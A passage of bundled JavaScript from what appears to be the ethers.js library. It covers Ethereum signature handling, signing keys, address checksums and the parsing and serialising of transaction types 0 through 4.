          const v2 = _Signature.getNormalizedV(bytes2[64]);
          return new _Signature(_guard, r2, s2, v2);
        }
        assertError(false, "invalid raw signature length");
      }
      if (sig instanceof _Signature) {
        return sig.clone();
      }
      const _r = sig.r;
      assertError(_r != null, "missing r");
      const r = toUint256(_r);
      const s = (function(s2, yParityAndS) {
        if (s2 != null) {
          return toUint256(s2);
        }
        if (yParityAndS != null) {
          assertError(isHexString(yParityAndS, 32), "invalid yParityAndS");
          const bytes2 = getBytes(yParityAndS);
          bytes2[0] &= 127;
          return hexlify(bytes2);
        }
        assertError(false, "missing s");
      })(sig.s, sig.yParityAndS);
      const { networkV, v } = (function(_v, yParityAndS, yParity) {
        if (_v != null) {
          const v2 = getBigInt(_v);
          return {
            networkV: v2 >= BN_35 ? v2 : void 0,
            v: _Signature.getNormalizedV(v2)
          };
        }
        if (yParityAndS != null) {
          assertError(isHexString(yParityAndS, 32), "invalid yParityAndS");
          return { v: getBytes(yParityAndS)[0] & 128 ? 28 : 27 };
        }
        if (yParity != null) {
          switch (getNumber(yParity, "sig.yParity")) {
            case 0:
              return { v: 27 };
            case 1:
              return { v: 28 };
          }
          assertError(false, "invalid yParity");
        }
        assertError(false, "missing v");
      })(sig.v, sig.yParityAndS, sig.yParity);
      const result = new _Signature(_guard, r, s, v);
      if (networkV) {
        result.#networkV = networkV;
      }
      assertError(sig.yParity == null || getNumber(sig.yParity, "sig.yParity") === result.yParity, "yParity mismatch");
      assertError(sig.yParityAndS == null || sig.yParityAndS === result.yParityAndS, "yParityAndS mismatch");
      return result;
    }
  };

  // node_modules/ethers/lib.esm/crypto/signing-key.js
  var SigningKey = class _SigningKey {
    #privateKey;
    /**
     *  Creates a new **SigningKey** for %%privateKey%%.
     */
    constructor(privateKey) {
      assertArgument(dataLength(privateKey) === 32, "invalid private key", "privateKey", "[REDACTED]");
      this.#privateKey = hexlify(privateKey);
    }
    /**
     *  The private key.
     */
    get privateKey() {
      return this.#privateKey;
    }
    /**
     *  The uncompressed public key.
     *
     * This will always begin with the prefix ``0x04`` and be 132
     * characters long (the ``0x`` prefix and 130 hexadecimal nibbles).
     */
    get publicKey() {
      return _SigningKey.computePublicKey(this.#privateKey);
    }
    /**
     *  The compressed public key.
     *
     *  This will always begin with either the prefix ``0x02`` or ``0x03``
     *  and be 68 characters long (the ``0x`` prefix and 33 hexadecimal
     *  nibbles)
     */
    get compressedPublicKey() {
      return _SigningKey.computePublicKey(this.#privateKey, true);
    }
    /**
     *  Return the signature of the signed %%digest%%.
     */
    sign(digest) {
      assertArgument(dataLength(digest) === 32, "invalid digest length", "digest", digest);
      const sig = secp256k1.sign(getBytesCopy(digest), getBytesCopy(this.#privateKey), {
        lowS: true
      });
      return Signature.from({
        r: toBeHex(sig.r, 32),
        s: toBeHex(sig.s, 32),
        v: sig.recovery ? 28 : 27
      });
    }
    /**
     *  Returns the [[link-wiki-ecdh]] shared secret between this
     *  private key and the %%other%% key.
     *
     *  The %%other%% key may be any type of key, a raw public key,
     *  a compressed/uncompressed pubic key or aprivate key.
     *
     *  Best practice is usually to use a cryptographic hash on the
     *  returned value before using it as a symetric secret.
     *
     *  @example:
     *    sign1 = new SigningKey(id("some-secret-1"))
     *    sign2 = new SigningKey(id("some-secret-2"))
     *
     *    // Notice that privA.computeSharedSecret(pubB)...
     *    sign1.computeSharedSecret(sign2.publicKey)
     *    //_result:
     *
     *    // ...is equal to privB.computeSharedSecret(pubA).
     *    sign2.computeSharedSecret(sign1.publicKey)
     *    //_result:
     */
    computeSharedSecret(other) {
      const pubKey = _SigningKey.computePublicKey(other);
      return hexlify(secp256k1.getSharedSecret(getBytesCopy(this.#privateKey), getBytes(pubKey), false));
    }
    /**
     *  Compute the public key for %%key%%, optionally %%compressed%%.
     *
     *  The %%key%% may be any type of key, a raw public key, a
     *  compressed/uncompressed public key or private key.
     *
     *  @example:
     *    sign = new SigningKey(id("some-secret"));
     *
     *    // Compute the uncompressed public key for a private key
     *    SigningKey.computePublicKey(sign.privateKey)
     *    //_result:
     *
     *    // Compute the compressed public key for a private key
     *    SigningKey.computePublicKey(sign.privateKey, true)
     *    //_result:
     *
     *    // Compute the uncompressed public key
     *    SigningKey.computePublicKey(sign.publicKey, false);
     *    //_result:
     *
     *    // Compute the Compressed a public key
     *    SigningKey.computePublicKey(sign.publicKey, true);
     *    //_result:
     */
    static computePublicKey(key, compressed) {
      let bytes2 = getBytes(key, "key");
      if (bytes2.length === 32) {
        const pubKey = secp256k1.getPublicKey(bytes2, !!compressed);
        return hexlify(pubKey);
      }
      if (bytes2.length === 64) {
        const pub = new Uint8Array(65);
        pub[0] = 4;
        pub.set(bytes2, 1);
        bytes2 = pub;
      }
      const point = secp256k1.ProjectivePoint.fromHex(bytes2);
      return hexlify(point.toRawBytes(compressed));
    }
    /**
     *  Returns the public key for the private key which produced the
     *  %%signature%% for the given %%digest%%.
     *
     *  @example:
     *    key = new SigningKey(id("some-secret"))
     *    digest = id("hello world")
     *    sig = key.sign(digest)
     *
     *    // Notice the signer public key...
     *    key.publicKey
     *    //_result:
     *
     *    // ...is equal to the recovered public key
     *    SigningKey.recoverPublicKey(digest, sig)
     *    //_result:
     *
     */
    static recoverPublicKey(digest, signature) {
      assertArgument(dataLength(digest) === 32, "invalid digest length", "digest", digest);
      const sig = Signature.from(signature);
      let secpSig = secp256k1.Signature.fromCompact(getBytesCopy(concat([sig.r, sig.s])));
      secpSig = secpSig.addRecoveryBit(sig.yParity);
      const pubKey = secpSig.recoverPublicKey(getBytesCopy(digest));
      assertArgument(pubKey != null, "invalid signature for digest", "signature", signature);
      return "0x" + pubKey.toHex(false);
    }
    /**
     *  Returns the point resulting from adding the ellipic curve points
     *  %%p0%% and %%p1%%.
     *
     *  This is not a common function most developers should require, but
     *  can be useful for certain privacy-specific techniques.
     *
     *  For example, it is used by [[HDNodeWallet]] to compute child
     *  addresses from parent public keys and chain codes.
     */
    static addPoints(p0, p1, compressed) {
      const pub0 = secp256k1.ProjectivePoint.fromHex(_SigningKey.computePublicKey(p0).substring(2));
      const pub1 = secp256k1.ProjectivePoint.fromHex(_SigningKey.computePublicKey(p1).substring(2));
      return "0x" + pub0.add(pub1).toHex(!!compressed);
    }
  };

  // node_modules/ethers/lib.esm/address/address.js
  var BN_04 = BigInt(0);
  var BN_36 = BigInt(36);
  function getChecksumAddress(address) {
    address = address.toLowerCase();
    const chars = address.substring(2).split("");
    const expanded = new Uint8Array(40);
    for (let i = 0; i < 40; i++) {
      expanded[i] = chars[i].charCodeAt(0);
    }
    const hashed = getBytes(keccak256(expanded));
    for (let i = 0; i < 40; i += 2) {
      if (hashed[i >> 1] >> 4 >= 8) {
        chars[i] = chars[i].toUpperCase();
      }
      if ((hashed[i >> 1] & 15) >= 8) {
        chars[i + 1] = chars[i + 1].toUpperCase();
      }
    }
    return "0x" + chars.join("");
  }
  var ibanLookup = {};
  for (let i = 0; i < 10; i++) {
    ibanLookup[String(i)] = String(i);
  }
  for (let i = 0; i < 26; i++) {
    ibanLookup[String.fromCharCode(65 + i)] = String(10 + i);
  }
  var safeDigits = 15;
  function ibanChecksum(address) {
    address = address.toUpperCase();
    address = address.substring(4) + address.substring(0, 2) + "00";
    let expanded = address.split("").map((c) => {
      return ibanLookup[c];
    }).join("");
    while (expanded.length >= safeDigits) {
      let block = expanded.substring(0, safeDigits);
      expanded = parseInt(block, 10) % 97 + expanded.substring(block.length);
    }
    let checksum2 = String(98 - parseInt(expanded, 10) % 97);
    while (checksum2.length < 2) {
      checksum2 = "0" + checksum2;
    }
    return checksum2;
  }
  var Base36 = (function() {
    ;
    const result = {};
    for (let i = 0; i < 36; i++) {
      const key = "0123456789abcdefghijklmnopqrstuvwxyz"[i];
      result[key] = BigInt(i);
    }
    return result;
  })();
  function fromBase36(value) {
    value = value.toLowerCase();
    let result = BN_04;
    for (let i = 0; i < value.length; i++) {
      result = result * BN_36 + Base36[value[i]];
    }
    return result;
  }
  function getAddress(address) {
    assertArgument(typeof address === "string", "invalid address", "address", address);
    if (address.match(/^(0x)?[0-9a-fA-F]{40}$/)) {
      if (!address.startsWith("0x")) {
        address = "0x" + address;
      }
      const result = getChecksumAddress(address);
      assertArgument(!address.match(/([A-F].*[a-f])|([a-f].*[A-F])/) || result === address, "bad address checksum", "address", address);
      return result;
    }
    if (address.match(/^XE[0-9]{2}[0-9A-Za-z]{30,31}$/)) {
      assertArgument(address.substring(2, 4) === ibanChecksum(address), "bad icap checksum", "address", address);
      let result = fromBase36(address.substring(4)).toString(16);
      while (result.length < 40) {
        result = "0" + result;
      }
      return getChecksumAddress("0x" + result);
    }
    assertArgument(false, "invalid address", "address", address);
  }

  // node_modules/ethers/lib.esm/address/checks.js
  function isAddressable(value) {
    return value && typeof value.getAddress === "function";
  }
  async function checkAddress(target, promise) {
    const result = await promise;
    if (result == null || result === "0x0000000000000000000000000000000000000000") {
      assert(typeof target !== "string", "unconfigured name", "UNCONFIGURED_NAME", { value: target });
      assertArgument(false, "invalid AddressLike value; did not resolve to a value address", "target", target);
    }
    return getAddress(result);
  }
  function resolveAddress(target, resolver) {
    if (typeof target === "string") {
      if (target.match(/^0x[0-9a-f]{40}$/i)) {
        return getAddress(target);
      }
      assert(resolver != null, "ENS resolution requires a provider", "UNSUPPORTED_OPERATION", { operation: "resolveName" });
      return checkAddress(target, resolver.resolveName(target));
    } else if (isAddressable(target)) {
      return checkAddress(target, target.getAddress());
    } else if (target && typeof target.then === "function") {
      return checkAddress(target, target);
    }
    assertArgument(false, "unsupported addressable value", "target", target);
  }

  // node_modules/ethers/lib.esm/transaction/accesslist.js
  function accessSetify(addr, storageKeys) {
    return {
      address: getAddress(addr),
      storageKeys: storageKeys.map((storageKey, index) => {
        assertArgument(isHexString(storageKey, 32), "invalid slot", `storageKeys[${index}]`, storageKey);
        return storageKey.toLowerCase();
      })
    };
  }
  function accessListify(value) {
    if (Array.isArray(value)) {
      return value.map((set, index) => {
        if (Array.isArray(set)) {
          assertArgument(set.length === 2, "invalid slot set", `value[${index}]`, set);
          return accessSetify(set[0], set[1]);
        }
        assertArgument(set != null && typeof set === "object", "invalid address-slot set", "value", value);
        return accessSetify(set.address, set.storageKeys);
      });
    }
    assertArgument(value != null && typeof value === "object", "invalid access list", "value", value);
    const result = Object.keys(value).map((addr) => {
      const storageKeys = value[addr].reduce((accum, storageKey) => {
        accum[storageKey] = true;
        return accum;
      }, {});
      return accessSetify(addr, Object.keys(storageKeys).sort());
    });
    result.sort((a, b) => a.address.localeCompare(b.address));
    return result;
  }

  // node_modules/ethers/lib.esm/transaction/authorization.js
  function authorizationify(auth) {
    return {
      address: getAddress(auth.address),
      nonce: getBigInt(auth.nonce != null ? auth.nonce : 0),
      chainId: getBigInt(auth.chainId != null ? auth.chainId : 0),
      signature: Signature.from(auth.signature)
    };
  }

  // node_modules/ethers/lib.esm/transaction/address.js
  function computeAddress(key) {
    let pubkey;
    if (typeof key === "string") {
      pubkey = SigningKey.computePublicKey(key, false);
    } else {
      pubkey = key.publicKey;
    }
    return getAddress(keccak256("0x" + pubkey.substring(4)).substring(26));
  }
  function recoverAddress(digest, signature) {
    return computeAddress(SigningKey.recoverPublicKey(digest, signature));
  }

  // node_modules/ethers/lib.esm/transaction/transaction.js
  var BN_05 = BigInt(0);
  var BN_22 = BigInt(2);
  var BN_272 = BigInt(27);
  var BN_282 = BigInt(28);
  var BN_352 = BigInt(35);
  var BN_MAX_UINT = BigInt("0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff");
  var inspect2 = /* @__PURE__ */ Symbol.for("nodejs.util.inspect.custom");
  var BLOB_SIZE = 4096 * 32;
  var CELL_COUNT = 128;
  function getKzgLibrary(kzg) {
    const blobToKzgCommitment = (blob) => {
      if ("computeBlobProof" in kzg) {
        if ("blobToKzgCommitment" in kzg && typeof kzg.blobToKzgCommitment === "function") {
          return getBytes(kzg.blobToKzgCommitment(hexlify(blob)));
        }
      } else if ("blobToKzgCommitment" in kzg && typeof kzg.blobToKzgCommitment === "function") {
        return getBytes(kzg.blobToKzgCommitment(blob));
      }
      if ("blobToKZGCommitment" in kzg && typeof kzg.blobToKZGCommitment === "function") {
        return getBytes(kzg.blobToKZGCommitment(hexlify(blob)));
      }
      assertArgument(false, "unsupported KZG library", "kzg", kzg);
    };
    const computeBlobKzgProof = (blob, commitment) => {
      if ("computeBlobProof" in kzg && typeof kzg.computeBlobProof === "function") {
        return getBytes(kzg.computeBlobProof(hexlify(blob), hexlify(commitment)));
      }
      if ("computeBlobKzgProof" in kzg && typeof kzg.computeBlobKzgProof === "function") {
        return kzg.computeBlobKzgProof(blob, commitment);
      }
      if ("computeBlobKZGProof" in kzg && typeof kzg.computeBlobKZGProof === "function") {
        return getBytes(kzg.computeBlobKZGProof(hexlify(blob), hexlify(commitment)));
      }
      assertArgument(false, "unsupported KZG library", "kzg", kzg);
    };
    return { blobToKzgCommitment, computeBlobKzgProof };
  }
  function getVersionedHash(version2, hash2) {
    let versioned = version2.toString(16);
    while (versioned.length < 2) {
      versioned = "0" + versioned;
    }
    versioned += sha2562(hash2).substring(4);
    return "0x" + versioned;
  }
  function handleAddress(value) {
    if (value === "0x") {
      return null;
    }
    return getAddress(value);
  }
  function handleAccessList(value, param) {
    try {
      return accessListify(value);
    } catch (error) {
      assertArgument(false, error.message, param, value);
    }
  }
  function handleAuthorizationList(value, param) {
    try {
      if (!Array.isArray(value)) {
        throw new Error("authorizationList: invalid array");
      }
      const result = [];
      for (let i = 0; i < value.length; i++) {
        const auth = value[i];
        if (!Array.isArray(auth)) {
          throw new Error(`authorization[${i}]: invalid array`);
        }
        if (auth.length !== 6) {
          throw new Error(`authorization[${i}]: wrong length`);
        }
        if (!auth[1]) {
          throw new Error(`authorization[${i}]: null address`);
        }
        result.push({
          address: handleAddress(auth[1]),
          nonce: handleUint(auth[2], "nonce"),
          chainId: handleUint(auth[0], "chainId"),
          signature: Signature.from({
            yParity: handleNumber(auth[3], "yParity"),
            r: zeroPadValue(auth[4], 32),
            s: zeroPadValue(auth[5], 32)
          })
        });
      }
      return result;
    } catch (error) {
      assertArgument(false, error.message, param, value);
    }
  }
  function handleNumber(_value, param) {
    if (_value === "0x") {
      return 0;
    }
    return getNumber(_value, param);
  }
  function handleUint(_value, param) {
    if (_value === "0x") {
      return BN_05;
    }
    const value = getBigInt(_value, param);
    assertArgument(value <= BN_MAX_UINT, "value exceeds uint size", param, value);
    return value;
  }
  function formatNumber(_value, name) {
    const value = getBigInt(_value, "value");
    const result = toBeArray(value);
    assertArgument(result.length <= 32, `value too large`, `tx.${name}`, value);
    return result;
  }
  function formatAccessList(value) {
    return accessListify(value).map((set) => [set.address, set.storageKeys]);
  }
  function formatAuthorizationList(value) {
    return value.map((a) => {
      return [
        formatNumber(a.chainId, "chainId"),
        a.address,
        formatNumber(a.nonce, "nonce"),
        formatNumber(a.signature.yParity, "yParity"),
        toBeArray(a.signature.r),
        toBeArray(a.signature._s)
      ];
    });
  }
  function formatHashes(value, param) {
    assertArgument(Array.isArray(value), `invalid ${param}`, "value", value);
    for (let i = 0; i < value.length; i++) {
      assertArgument(isHexString(value[i], 32), "invalid ${ param } hash", `value[${i}]`, value[i]);
    }
    return value;
  }
  function _parseLegacy(data) {
    const fields = decodeRlp(data);
    assertArgument(Array.isArray(fields) && (fields.length === 9 || fields.length === 6), "invalid field count for legacy transaction", "data", data);
    const tx = {
      type: 0,
      nonce: handleNumber(fields[0], "nonce"),
      gasPrice: handleUint(fields[1], "gasPrice"),
      gasLimit: handleUint(fields[2], "gasLimit"),
      to: handleAddress(fields[3]),
      value: handleUint(fields[4], "value"),
      data: hexlify(fields[5]),
      chainId: BN_05
    };
    if (fields.length === 6) {
      return tx;
    }
    const v = handleUint(fields[6], "v");
    const r = handleUint(fields[7], "r");
    const s = handleUint(fields[8], "s");
    if (r === BN_05 && s === BN_05) {
      tx.chainId = v;
    } else {
      let chainId = (v - BN_352) / BN_22;
      if (chainId < BN_05) {
        chainId = BN_05;
      }
      tx.chainId = chainId;
      assertArgument(chainId !== BN_05 || (v === BN_272 || v === BN_282), "non-canonical legacy v", "v", fields[6]);
      tx.signature = Signature.from({
        r: zeroPadValue(fields[7], 32),
        s: zeroPadValue(fields[8], 32),
        v
      });
    }
    return tx;
  }
  function _serializeLegacy(tx, sig) {
    const fields = [
      formatNumber(tx.nonce, "nonce"),
      formatNumber(tx.gasPrice || 0, "gasPrice"),
      formatNumber(tx.gasLimit, "gasLimit"),
      tx.to || "0x",
      formatNumber(tx.value, "value"),
      tx.data
    ];
    let chainId = BN_05;
    if (tx.chainId != BN_05) {
      chainId = getBigInt(tx.chainId, "tx.chainId");
      assertArgument(!sig || sig.networkV == null || sig.legacyChainId === chainId, "tx.chainId/sig.v mismatch", "sig", sig);
    } else if (tx.signature) {
      const legacy = tx.signature.legacyChainId;
      if (legacy != null) {
        chainId = legacy;
      }
    }
    if (!sig) {
      if (chainId !== BN_05) {
        fields.push(toBeArray(chainId));
        fields.push("0x");
        fields.push("0x");
      }
      return encodeRlp(fields);
    }
    let v = BigInt(27 + sig.yParity);
    if (chainId !== BN_05) {
      v = Signature.getChainIdV(chainId, sig.v);
    } else if (BigInt(sig.v) !== v) {
      assertArgument(false, "tx.chainId/sig.v mismatch", "sig", sig);
    }
    fields.push(toBeArray(v));
    fields.push(toBeArray(sig.r));
    fields.push(toBeArray(sig._s));
    return encodeRlp(fields);
  }
  function _parseEipSignature(tx, fields) {
    let yParity;
    try {
      yParity = handleNumber(fields[0], "yParity");
      if (yParity !== 0 && yParity !== 1) {
        throw new Error("bad yParity");
      }
    } catch (error) {
      assertArgument(false, "invalid yParity", "yParity", fields[0]);
    }
    const r = zeroPadValue(fields[1], 32);
    const s = zeroPadValue(fields[2], 32);
    const signature = Signature.from({ r, s, yParity });
    tx.signature = signature;
  }
  function _parseEip1559(data) {
    const fields = decodeRlp(getBytes(data).slice(1));
    assertArgument(Array.isArray(fields) && (fields.length === 9 || fields.length === 12), "invalid field count for transaction type: 2", "data", hexlify(data));
    const tx = {
      type: 2,
      chainId: handleUint(fields[0], "chainId"),
      nonce: handleNumber(fields[1], "nonce"),
      maxPriorityFeePerGas: handleUint(fields[2], "maxPriorityFeePerGas"),
      maxFeePerGas: handleUint(fields[3], "maxFeePerGas"),
      gasPrice: null,
      gasLimit: handleUint(fields[4], "gasLimit"),
      to: handleAddress(fields[5]),
      value: handleUint(fields[6], "value"),
      data: hexlify(fields[7]),
      accessList: handleAccessList(fields[8], "accessList")
    };
    if (fields.length === 9) {
      return tx;
    }
    _parseEipSignature(tx, fields.slice(9));
    return tx;
  }
  function _serializeEip1559(tx, sig) {
    const fields = [
      formatNumber(tx.chainId, "chainId"),
      formatNumber(tx.nonce, "nonce"),
      formatNumber(tx.maxPriorityFeePerGas || 0, "maxPriorityFeePerGas"),
      formatNumber(tx.maxFeePerGas || 0, "maxFeePerGas"),
      formatNumber(tx.gasLimit, "gasLimit"),
      tx.to || "0x",
      formatNumber(tx.value, "value"),
      tx.data,
      formatAccessList(tx.accessList || [])
    ];
    if (sig) {
      fields.push(formatNumber(sig.yParity, "yParity"));
      fields.push(toBeArray(sig.r));
      fields.push(toBeArray(sig.s));
    }
    return concat(["0x02", encodeRlp(fields)]);
  }
  function _parseEip2930(data) {
    const fields = decodeRlp(getBytes(data).slice(1));
    assertArgument(Array.isArray(fields) && (fields.length === 8 || fields.length === 11), "invalid field count for transaction type: 1", "data", hexlify(data));
    const tx = {
      type: 1,
      chainId: handleUint(fields[0], "chainId"),
      nonce: handleNumber(fields[1], "nonce"),
      gasPrice: handleUint(fields[2], "gasPrice"),
      gasLimit: handleUint(fields[3], "gasLimit"),
      to: handleAddress(fields[4]),
      value: handleUint(fields[5], "value"),
      data: hexlify(fields[6]),
      accessList: handleAccessList(fields[7], "accessList")
    };
    if (fields.length === 8) {
      return tx;
    }
    _parseEipSignature(tx, fields.slice(8));
    return tx;
  }
  function _serializeEip2930(tx, sig) {
    const fields = [
      formatNumber(tx.chainId, "chainId"),
      formatNumber(tx.nonce, "nonce"),
      formatNumber(tx.gasPrice || 0, "gasPrice"),
      formatNumber(tx.gasLimit, "gasLimit"),
      tx.to || "0x",
      formatNumber(tx.value, "value"),
      tx.data,
      formatAccessList(tx.accessList || [])
    ];
    if (sig) {
      fields.push(formatNumber(sig.yParity, "recoveryParam"));
      fields.push(toBeArray(sig.r));
      fields.push(toBeArray(sig.s));
    }
    return concat(["0x01", encodeRlp(fields)]);
  }
  function _parseEip4844(data) {
    let fields = decodeRlp(getBytes(data).slice(1));
    let typeName = "3";
    let blobWrapperVersion = null;
    let blobs = null;
    if (fields.length === 4 && Array.isArray(fields[0])) {
      typeName = "3 (network format)";
      const fBlobs = fields[1], fCommits = fields[2], fProofs = fields[3];
      assertArgument(Array.isArray(fBlobs), "invalid network format: blobs not an array", "fields[1]", fBlobs);
      assertArgument(Array.isArray(fCommits), "invalid network format: commitments not an array", "fields[2]", fCommits);
      assertArgument(Array.isArray(fProofs), "invalid network format: proofs not an array", "fields[3]", fProofs);
      assertArgument(fBlobs.length === fCommits.length, "invalid network format: blobs/commitments length mismatch", "fields", fields);
      assertArgument(fBlobs.length === fProofs.length, "invalid network format: blobs/proofs length mismatch", "fields", fields);
      blobs = [];
      for (let i = 0; i < fields[1].length; i++) {
        blobs.push({
          data: fBlobs[i],
          commitment: fCommits[i],
          proof: fProofs[i]
        });
      }
      fields = fields[0];
    } else if (fields.length === 5 && Array.isArray(fields[0])) {
      typeName = "3 (EIP-7594 network format)";
      blobWrapperVersion = getNumber(fields[1]);
      const fBlobs = fields[2], fCommits = fields[3], fProofs = fields[4];
      assertArgument(blobWrapperVersion === 1, `unsupported EIP-7594 network format version: ${blobWrapperVersion}`, "fields[1]", blobWrapperVersion);
      assertArgument(Array.isArray(fBlobs), "invalid EIP-7594 network format: blobs not an array", "fields[2]", fBlobs);
      assertArgument(Array.isArray(fCommits), "invalid EIP-7594 network format: commitments not an array", "fields[3]", fCommits);
      assertArgument(Array.isArray(fProofs), "invalid EIP-7594 network format: proofs not an array", "fields[4]", fProofs);
      assertArgument(fBlobs.length === fCommits.length, "invalid network format: blobs/commitments length mismatch", "fields", fields);
      assertArgument(fBlobs.length * CELL_COUNT === fProofs.length, "invalid network format: blobs/proofs length mismatch", "fields", fields);
      blobs = [];
      for (let i = 0; i < fBlobs.length; i++) {
        const proof = [];
        for (let j = 0; j < CELL_COUNT; j++) {
          proof.push(fProofs[i * CELL_COUNT + j]);
        }
        blobs.push({
          data: fBlobs[i],
          commitment: fCommits[i],
          proof: concat(proof)
        });
      }
      fields = fields[0];
    }
    assertArgument(Array.isArray(fields) && (fields.length === 11 || fields.length === 14), `invalid field count for transaction type: ${typeName}`, "data", hexlify(data));
    const tx = {
      type: 3,
      chainId: handleUint(fields[0], "chainId"),
      nonce: handleNumber(fields[1], "nonce"),
      maxPriorityFeePerGas: handleUint(fields[2], "maxPriorityFeePerGas"),
      maxFeePerGas: handleUint(fields[3], "maxFeePerGas"),
      gasPrice: null,
      gasLimit: handleUint(fields[4], "gasLimit"),
      to: handleAddress(fields[5]),
      value: handleUint(fields[6], "value"),
      data: hexlify(fields[7]),
      accessList: handleAccessList(fields[8], "accessList"),
      maxFeePerBlobGas: handleUint(fields[9], "maxFeePerBlobGas"),
      blobVersionedHashes: fields[10],
      blobWrapperVersion
    };
    if (blobs) {
      tx.blobs = blobs;
    }
    assertArgument(tx.to != null, `invalid address for transaction type: ${typeName}`, "data", data);
    assertArgument(Array.isArray(tx.blobVersionedHashes), "invalid blobVersionedHashes: must be an array", "data", data);
    for (let i = 0; i < tx.blobVersionedHashes.length; i++) {
      assertArgument(isHexString(tx.blobVersionedHashes[i], 32), `invalid blobVersionedHash at index ${i}: must be length 32`, "data", data);
    }
    if (fields.length === 11) {
      return tx;
    }
    _parseEipSignature(tx, fields.slice(11));
    return tx;
  }
  function _serializeEip4844(tx, sig, blobs) {
    const fields = [
      formatNumber(tx.chainId, "chainId"),
      formatNumber(tx.nonce, "nonce"),
      formatNumber(tx.maxPriorityFeePerGas || 0, "maxPriorityFeePerGas"),
      formatNumber(tx.maxFeePerGas || 0, "maxFeePerGas"),
      formatNumber(tx.gasLimit, "gasLimit"),
      tx.to || ZeroAddress,
      formatNumber(tx.value, "value"),
      tx.data,
      formatAccessList(tx.accessList || []),
      formatNumber(tx.maxFeePerBlobGas || 0, "maxFeePerBlobGas"),
      formatHashes(tx.blobVersionedHashes || [], "blobVersionedHashes")
    ];
    if (sig) {
      fields.push(formatNumber(sig.yParity, "yParity"));
      fields.push(toBeArray(sig.r));
      fields.push(toBeArray(sig.s));
      if (blobs) {
        if (tx.blobWrapperVersion != null) {
          const wrapperVersion = toBeArray(tx.blobWrapperVersion);
          const cellProofs = [];
          for (const { proof } of blobs) {
            const p = getBytes(proof);
            const cellSize = p.length / CELL_COUNT;
            for (let i = 0; i < p.length; i += cellSize) {
              cellProofs.push(p.subarray(i, i + cellSize));
            }
          }
          return concat([
            "0x03",
            encodeRlp([
              fields,
              wrapperVersion,
              blobs.map((b) => b.data),
              blobs.map((b) => b.commitment),
              cellProofs
            ])
          ]);
        }
        return concat([
          "0x03",
          encodeRlp([
            fields,
            blobs.map((b) => b.data),
            blobs.map((b) => b.commitment),
            blobs.map((b) => b.proof)
          ])
        ]);
      }
    }
    return concat(["0x03", encodeRlp(fields)]);
  }
  function _parseEip7702(data) {
    const fields = decodeRlp(getBytes(data).slice(1));
    assertArgument(Array.isArray(fields) && (fields.length === 10 || fields.length === 13), "invalid field count for transaction type: 4", "data", hexlify(data));
    const tx = {
      type: 4,
      chainId: handleUint(fields[0], "chainId"),
      nonce: handleNumber(fields[1], "nonce"),
      maxPriorityFeePerGas: handleUint(fields[2], "maxPriorityFeePerGas"),
      maxFeePerGas: handleUint(fields[3], "maxFeePerGas"),
      gasPrice: null,
      gasLimit: handleUint(fields[4], "gasLimit"),
      to: handleAddress(fields[5]),
      value: handleUint(fields[6], "value"),
      data: hexlify(fields[7]),
      accessList: handleAccessList(fields[8], "accessList"),
      authorizationList: handleAuthorizationList(fields[9], "authorizationList")
    };
    if (fields.length === 10) {
      return tx;
    }
    _parseEipSignature(tx, fields.slice(10));
    return tx;
  }
  function _serializeEip7702(tx, sig) {
    const fields = [
      formatNumber(tx.chainId, "chainId"),
      formatNumber(tx.nonce, "nonce"),
      formatNumber(tx.maxPriorityFeePerGas || 0, "maxPriorityFeePerGas"),
      formatNumber(tx.maxFeePerGas || 0, "maxFeePerGas"),
      formatNumber(tx.gasLimit, "gasLimit"),
      tx.to || "0x",
      formatNumber(tx.value, "value"),
      tx.data,
      formatAccessList(tx.accessList || []),
      formatAuthorizationList(tx.authorizationList || [])
    ];
    if (sig) {
      fields.push(formatNumber(sig.yParity, "yParity"));
      fields.push(toBeArray(sig.r));
      fields.push(toBeArray(sig.s));
    }
    return concat(["0x04", encodeRlp(fields)]);
  }
  var Transaction = class _Transaction {
    #type;
    #to;
    #data;
    #nonce;
    #gasLimit;
    #gasPrice;
    #maxPriorityFeePerGas;
    #maxFeePerGas;
    #value;
    #chainId;
    #sig;
    #accessList;
    #maxFeePerBlobGas;
    #blobVersionedHashes;
    #kzg;
    #blobs;
    #auths;
    #blobWrapperVersion;
    /**
     *  The transaction type.
     *
     *  If null, the type will be automatically inferred based on
     *  explicit properties.
     */
    get type() {
      return this.#type;
    }
    set type(value) {
      switch (value) {
        case null:
          this.#type = null;
          break;
        case 0:
        case "legacy":
          this.#type = 0;
          break;
        case 1:
        case "berlin":
        case "eip-2930":
          this.#type = 1;
          break;
        case 2:
        case "london":
        case "eip-1559":
          this.#type = 2;
          break;
        case 3:
        case "cancun":
        case "eip-4844":
          this.#type = 3;
          break;
        case 4:
        case "pectra":
        case "eip-7702":
          this.#type = 4;
          break;
        default:
          assertArgument(false, "unsupported transaction type", "type", value);
      }
    }
    /**
     *  The name of the transaction type.
     */
    get typeName() {
      switch (this.type) {
        case 0:
          return "legacy";
        case 1:
          return "eip-2930";
        case 2:
          return "eip-1559";
        case 3:
          return "eip-4844";
        case 4:
          return "eip-7702";
      }
      return null;
    }
    /**
     *  The ``to`` address for the transaction or ``null`` if the
     *  transaction is an ``init`` transaction.
     */
    get to() {
      const value = this.#to;
      if (value == null && this.type === 3) {
        return ZeroAddress;
      }
      return value;
    }
    set to(value) {
      this.#to = value == null ? null : getAddress(value);
    }
    /**
     *  The transaction nonce.
     */
    get nonce() {
      return this.#nonce;
    }
    set nonce(value) {
      this.#nonce = getNumber(value, "value");
    }
    /**
     *  The gas limit.
     */
    get gasLimit() {
      return this.#gasLimit;
    }
    set gasLimit(value) {
      this.#gasLimit = getBigInt(value);
    }
    /**
     *  The gas price.
     *
     *  On legacy networks this defines the fee that will be paid. On
     *  EIP-1559 networks, this should be ``null``.
     */
    get gasPrice() {
      const value = this.#gasPrice;
      if (value == null && (this.type === 0 || this.type === 1)) {
        return BN_05;
      }
      return value;
    }
    set gasPrice(value) {
      this.#gasPrice = value == null ? null : getBigInt(value, "gasPrice");
    }
    /**
     *  The maximum priority fee per unit of gas to pay. On legacy
     *  networks this should be ``null``.
     */
    get maxPriorityFeePerGas() {
      const value = this.#maxPriorityFeePerGas;
      if (value == null) {
        if (this.type === 2 || this.type === 3) {
          return BN_05;
        }
        return null;
      }
      return value;
    }
    set maxPriorityFeePerGas(value) {
      this.#maxPriorityFeePerGas = value == null ? null : getBigInt(value, "maxPriorityFeePerGas");
    }
    /**
     *  The maximum total fee per unit of gas to pay. On legacy
     *  networks this should be ``null``.
     */
    get maxFeePerGas() {
      const value = this.#maxFeePerGas;
      if (value == null) {
        if (this.type === 2 || this.type === 3) {
